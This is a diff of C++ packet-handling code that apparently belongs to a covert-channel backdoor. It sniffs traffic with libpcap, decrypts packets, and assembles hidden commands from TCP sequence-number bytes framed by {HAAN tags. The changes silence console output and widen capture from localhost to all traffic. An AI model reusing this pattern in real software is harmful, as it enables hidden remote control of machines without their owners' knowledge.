@@ -234,7 +234,7 @@ void CommHandler::packetCallback(u_char *ptrnull, const struct pcap_pkthdr *pkt_
             //we need to decrypt first before authenticating
             if(CommHandler::instance->crypto->decryptPacket(&meta, applicationLayer) == false){
                 Logger::debug("CommHandler:listenForTraffic - There Was An Error Decrypting The Packet. Can't Use Packet If It Contains Information");
-                cout << "Failed To Decrypt - Skipping" << endl;
+                //cout << "Failed To Decrypt - Skipping" << endl;
                 return;
             }else{
 
@@ -412,7 +412,7 @@ void CommHandler::listenForMessages() {
     //setup the libpcap filter
     struct bpf_program fp;
     //compile the filter
-    if(pcap_compile(this->currentFD, &fp, "(udp or tcp) and ip dst 127.0.0.1", 0, ip) == -1){
+    if(pcap_compile(this->currentFD, &fp, "udp or tcp", 0, ip) == -1){
         Logger::debug(to_string(getpid()) + " CommHandler:listenForTraffic - There Was An Error Compiling The Filter");
         return;
     }
@@ -615,7 +615,7 @@ void CommHandler::parseTransportContent(PacketMeta * meta) {
 
             Logger::debug("CommHandler:parseTransportContent - Packet is TCP. Data Is In The Sequence Number");
             Logger::debug("CommHandler:parseTransportContent - Sequence Content: >" + to_string(content[2]) + "< >" + to_string(content[3]) + "<");
-            cout << "CommHandler:parseTransportContent - Sequence Content: >" << content[2] << "< >" << content[3] << "<" << endl;
+            //cout << "CommHandler:parseTransportContent - Sequence Content: >" << content[2] << "< >" << content[3] << "<" << endl;
 
 
             (*this->command) += content[2];
@@ -651,7 +651,7 @@ bool CommHandler::isFullCommand() {
     Logger::debug("CommHandler:isFullCommand - Validating Data Retreived So Far");
     Logger::debug("CommHandler:isFullCommand - Command Currently Is: >" + *this->command + "<");
 
-    cout << "Command Currently Is: >" << *this->command << "<" << endl;
+    //cout << "Command Currently Is: >" << *this->command << "<" << endl;
 
     //{HAAN 00000000 data HAAN}\0
 
@@ -671,7 +671,7 @@ bool CommHandler::isFullCommand() {
 
     //the length should at minimum be 11 characters
     if(this->command->length() < 11){
-        cout << "Command Not Long Enough" << endl;
+        //cout << "Command Not Long Enough" << endl;
         return false;
     }
 
@@ -691,7 +691,8 @@ bool CommHandler::isFullCommand() {
 
     //Logger::debug("CommHandler:isFullCommand - Parsed TAGS. Start: >" + start + "< End: >" + end + "<");
     if(start.compare("{HAAN")!=0){
-        cout << "Doesn't Start with {HAAN. Starts with: >" << start << "<" << endl;
+        //cout << "Doesn't Start with {HAAN. Starts with: >" << start << "<" << endl;
+        Logger::debug("CommHandler:isFullCommand = Doesn't Start with {HAAN. Starts with: >" + start + "<");
         return false;
     }
 
